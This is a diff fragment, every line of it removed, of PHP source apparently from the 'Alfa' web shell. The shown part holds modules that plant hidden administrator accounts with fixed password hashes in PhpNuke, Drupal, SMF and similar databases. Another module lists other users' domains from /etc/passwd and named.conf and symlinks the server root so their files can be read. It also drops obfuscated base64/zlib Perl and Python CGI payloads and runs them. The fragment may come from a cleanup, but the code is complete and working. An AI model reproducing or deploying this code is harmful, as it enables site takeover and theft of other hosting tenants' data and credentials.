-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa4'];
-$password = $_POST['alfa5'];
-$admin = $_POST['alfa8'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
-}
-}
-if(isset($_POST['alfa8']) && $_POST['alfa8'] == 'nuke'){
-
-echo __pre().'<center><div class="txtfont_header">| PhpNuke |</div><p><p>'.getConfigHtml('phpnuke').'</p><form onsubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'nuke\',this.email.value,this.prefix.value); return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host','id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
- 'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
-);
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa4'];
-$password = $_POST['alfa5'];
-$admin = $_POST['alfa7'];
-$SQL = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$hash = md5($pwd);
-$solevisible=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
-}
-}
-if(isset($_POST['alfa9']) && $_POST['alfa9'] == 'drupal'){
-
-echo __pre().'<center><div class="txtfont_header">| Drupal |</div><p><p>'.getConfigHtml('drupal').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,null,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'drupal\'); return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true)
- );
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa4'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$admin = $_POST['alfa8'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$getDescuid = @mysqli_query($conn,"select uid from users order by uid desc limit 0,1");
-$getDescuid = @mysqli_fetch_assoc($getDescuid);
-$getDescuid = $getDescuid['uid'];
-$getdescuid = $getDescuid++;
-$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisible@fbi.gov','filtered_html','1','Europe/Berlin','solevisible@fbi.gov')") or die(mysqli_error($conn));
-$solevisible=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
-$sole = mysqli_num_rows($solevisible);
-if ($sole == 1){
-$solevis = mysqli_fetch_assoc($solevisible);
-$res = $solevis['uid'];
-}
-$solevisible=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
-}
-}
-
-if(isset($_POST['alfa10']) && $_POST['alfa10'] == 'smf'){
-
-echo __pre().'<center><center><div class="txtfont_header">| SMF |</div><p><p>'.getConfigHtml('smf').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,null,this.username.value,this.password.value,this.prefix.value,this.admin.value,null,\'smf\'); return false;" method="POST">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'smf_', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
- 'td7' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
- );
-create_table($table);
-echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
-$localhost = $_POST['alfa2'];
-$database = $_POST['alfa3'];
-$username = $_POST['alfa5'];
-$password = $_POST['alfa6'];
-$prefix = $_POST['alfa7'];
-$admin = $_POST['alfa8'];
-$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
-$setpwAlg = sha1(strtolower($admin) . 'solevisible');
-$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','solevisible@fbi.gov')") or die(mysqli_error($conn));
-if($solevisible){
-__alert('Success... '.$admin.' is created...');}
-}
-}
-echo "</div>";
-alfafooter();
-}
-function alfaMakePwd(){
-	if(_alfa_file_exists("/etc/virtual/domainowners")||(_alfa_file_exists("/etc/named.conf")&&_alfa_file_exists("/etc/valiases"))){
-		return "/home/{user}/public_html/";
-	}
-	$document = explode("/", $_SERVER["DOCUMENT_ROOT"]);
-	$public = end($document);
-	array_pop($document);
-	array_pop($document);
-	$path = implode("/", $document) . "/{user}/" . $public;
-	return $path;
-}
-function alfaGetDomains($state = false){
-	$state = "named.conf";
-	$lines = array();
-	$lines = _alfa_file('/etc/named.conf');
-	if(!$lines){
-		$lines = @scandir("/etc/valiases/");
-		$state = "valiases";
-		if(!$lines){
-			$lines = @scandir("/var/named");
-			$state = "named";
-			if(!$lines && $state){
-				$lines = _alfa_file('/etc/passwd');
-				$state = "passwd";
-			}
-		}
-	}
-	return array("lines" => $lines, "state" => $state);
-}
-function alfaCreateParentFolder(){
-	$parent = $GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__;
-	if(!@is_dir($parent)){
-		@mkdir($parent, 0755, true);
-	}
-}
-function alfasymlink(){
-alfahead();
-AlfaNum(9,10);
-alfaCreateParentFolder();
-@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
-echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0)onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
-if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
-	$sympath = alfaMakePwd();
-	@mkdir('cgialfa',0755);
-	@chdir('cgialfa');
-	alfacgihtaccess('cgi');
-	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
-	$py = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
-	$cginame = "symperl.alfa";
-	$source = $perl;
-	$lang = "perl";
-	if($_POST["alfa2"]=="sympy"){
-		$cginame = "pysymlink.alfa";
-		$source = $py;
-		$lang = "python";
-	}
-	@__write_file($cginame,$source);
-	@chmod($cginame,0755);
-	echo __pre();
-	$resource = alfaEx("{$lang} {$cginame} {$sympath}",false,true,true);
-	if(strlen($resource) == 0){
-		echo AlfaiFrameCreator('cgialfa/'.$cginame);
-	}else{
-		echo $resource;
-	}
-}
-if(isset($_POST['alfa4']) && $_POST['alfa4']=='SymFile'){
-if(function_exists('symlink')||_alfa_can_runCommand(true,true)){
-AlfaNum(9,10);
-echo __pre().'
-<center><p><div class="txtfont_header">| Symlink File And Directory |</div></p><form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
-<input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br />
-<input type="text" name="symfile" placeholder="Example : alfa.txt" size="60"/>
-<p><input type="submit" value=" " name="symlink" /></p></form></center>';
-$path = $_POST['alfa5'];
-$symname = $_POST['alfa6'];
-$solevisible58 = $_POST['alfa7'];
-if($solevisible58){
-$new_name = str_replace(".", "_", basename($symname));
-$rand_dir = $new_name.rand(111,9999);
-$sym_dir = 'alfasymlinkphp/'.$rand_dir.'/';
-@mkdir($sym_dir, 0777, true);
-alfacgihtaccess('sym', $sym_dir, $symname);
-_alfa_symlink("$path","$sym_dir/$symname");
-echo __pre();
-echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
-}
-}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
-}
-if(isset($_POST['alfa2']) && $_POST['alfa2']=='symphp'){
-$cant_symlink = true;
-if(function_exists('symlink')||_alfa_can_runCommand(false,false)){
-@mkdir('alfasymlink',0777);
-alfacgihtaccess('sym','alfasymlink/');
-_alfa_symlink('/','alfasymlink/root');
-$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
-if(_alfa_file_exists("/etc/named.conf") && !_alfa_file_exists("/etc/virtual/domainowners") && _alfa_file_exists("/etc/valiases/")){
-echo "<center>";
-$lines = array();
-$anony_domains = array();
-$anonymous_users = array();
-$f_black = array();
-$error = false;
-$anonymous = false;
-$makepwd = "/home/{user}/public_html/";
-$domains = alfaGetDomains();
-$lines = $domains["lines"];
-$state = $domains["state"];
-$is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
-$can_runcmd = _alfa_can_runCommand(false,false);
-if(!$is_posix && !$can_runcmd){
-	$anonymous = true;
-	$anony_domains = $domains["lines"];
-	$lines = _alfa_file('/etc/passwd');
-}
-echo $table_header;
-$count=1;
-$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
-foreach($lines as $line){
-	$domain = "";
-	$owner = "";
-	if($anonymous){
-		$explode = explode(":", $line);
-		$owner = $explode[0];
-		$owner_len = strlen($owner) - 1;
-		$userid = $explode[2];
-		if((int)$userid < 500)continue;
-		$domain = "[?????]";
-		$temp_black = array();
-		$finded = false;
-		foreach($anony_domains as $anony){
-			if($state == "named.conf"){
-				if(@strstr($anony, 'zone')){
-					preg_match_all('#zone "(.*)"#',$anony, $data);
-					$domain = $data[1][0];
-				}else{
-					continue;
-				}
-			}elseif($state == "named" || $state == "valiases"){
-				if($anony == "." || $anony == "..")continue;
-				if($state == "named")$anony = rtrim($anony, ".db");
-				$domain = $anony;
-			}
-			$sub_domain = str_replace(array("-","."), "", $domain);
-			if(substr($owner, 0, $owner_len) == substr($sub_domain, 0, $owner_len)){
-				if(in_array($owner.$domain, $temp_black))continue;
-				$sympath = str_replace("{user}", $owner, $makepwd);
-				$http = "http://".$domain;
-				echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
-				$count++;
-				$temp_black[] = $owner.$domain;
-				$finded = true;
-			}
-		}
-		if(!$finded){
-			$anonymous_users[] = $owner;
-		}
-	}else{
- 		if($state == "named.conf"){
-			if(@strstr($line, 'zone')){
-				preg_match_all('#zone "(.*)"#',$line, $data);
-				$domain = $data[1][0];
-			}else{
-				continue;
-			}
-		}elseif($state == "named" || $state == "valiases"){
-			if($line == "." || $line == "..")continue;
-			if($state == "named")$line = rtrim($line, ".db");
-			$domain = $line;
-		}
-		if(strlen(trim($domain)) > 2 && $state != "passwd"){
-			if(!_alfa_file_exists('/etc/valiases/'.$domain, false))continue;
-			if($is_posix){
-				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
-				$owner = $user["name"];
-			}elseif($can_runcmd){
-				$owner = alfaEx("stat -c '%U' /etc/valiases/".$domain,false,false);
-			}
-		}
-	}
-	if(!$anonymous){
-		if(strlen($owner)==0 || in_array($owner.$domain, $f_black))continue;
-		$sympath = str_replace("{user}", $owner, $makepwd);
-		$http = "http://".$domain;
-		if($state == "passwd"){
-			$http = "javascript:alert('we cant find domain...')";
-		}
-		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
-		$count++;
-		$f_black[] = $owner.$domain;
-	}
-}
-if($anonymous){
-	foreach($anonymous_users as $owner){
-		$sympath = str_replace("{user}", $owner, $makepwd);
-		$http = "javascript:alert('we cant find domain...')";
-		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, "[????]", $owner, $sympath), $template);
-		$count++;
-	}
-}
-$cant_symlink = false;
-}else{
-$is_direct = false;
-$makepwd = alfaMakePwd();
-if(_alfa_file_exists("/etc/virtual/domainowners")){
-	$makepwd = "/home/{user}/public_html";
-	$is_direct = true;
-}
-$sole = _alfa_file("/etc/virtual/domainowners");
-$count=1;
-echo $table_header;
-$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
-if($sole){
-	foreach($sole as $visible){
-		if(@strstr($visible,":")){
-			$solevisible = explode(':', $visible);
-			$cwd = str_replace("{user}", trim($solevisible[1]), $makepwd);
-			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($solevisible[1]), trim($solevisible[0]), $cwd), $template);
-		}
-	}
-}else{
-	$passwd = _alfa_file("/etc/passwd");
-	if($passwd){
-		$html = "";
-		$is_named = false;
-		$users = array();
-		$domains = array();
-		$uknowns = array();
-		foreach($passwd as $user){
-			$user = trim($user);
-			$expl = explode(":", $user);
-			if((int)$expl[2] < 500)continue;
-			$users[$expl[0]] = $expl[5];
-		}
-		$site_domains = @scandir("/etc/virtual/");
-		if(!$site_domains){
-			$site_domains = alfaEx("ls /etc/virtual/");
-			$site_domains = explode("\n", $site_domains);
-			if(!$site_domains){
-				$site_domains = _alfa_file("/etc/named.conf");
-				if($site_domains){$is_named = true;}
-			}
-		}
-		foreach($site_domains as $line){
-			if($is_named){
-				if(@strstr($line, 'zone')){
-					preg_match_all('#zone "(.*)"#',$line, $data);
-					$domain = $data[1][0];
-					if(strlen($domain  > 2) && !empty($domain)){
-						$domains[] = $domain;
-					}
-				}
-			}else{
-				$domains[] = $line;
-			}
-		}
-		$x = 1;
-		foreach($users as $user => $home){
-			foreach($domains as $domain){
-				$user_len = strlen($user) - 1;
-				$sub_domain = str_replace(array("-","."), "", $domain);
-				$five_user = substr($user, 0,$user_len);
-				$five_domain = substr($sub_domain, 0,$user_len);
-				if($five_user == $five_domain){
-					if($is_direct){
-						$cwd = str_replace("{user}", $user, $makepwd);
-					}else{
-						$expl = explode("}/", $makepwd);
-						$cwd = $home."/".$expl[1];
-					}
-					$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, $domain, $cwd), $template);
-				}else{
-					$uknowns[$user] = $home;
-				}
-			}
-		}
-		$uknowns = array_unique($uknowns);
-		foreach($uknowns as $user => $home){
-			if($is_direct){
-				$cwd = str_replace("{user}", $user, $makepwd);
-			}else{
-				$expl = explode("}/", $makepwd);
-				$cwd = $home."/".$expl[1];
-			}
-			$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, "[?????]", $cwd), $template);
-		}
-		echo($html);
-	}
-}
-echo "</table>";
-$cant_symlink = false;
-}
-}else{
-	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
-	$cant_symlink = false;
-}
-if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">Error...</font></b><br>';
-echo "</center></table>";
-}
-echo "</div>";
-alfafooter();
-}
-function alfasql(){
-class DbClass{
-public $type;
-public $link;
-public $res;
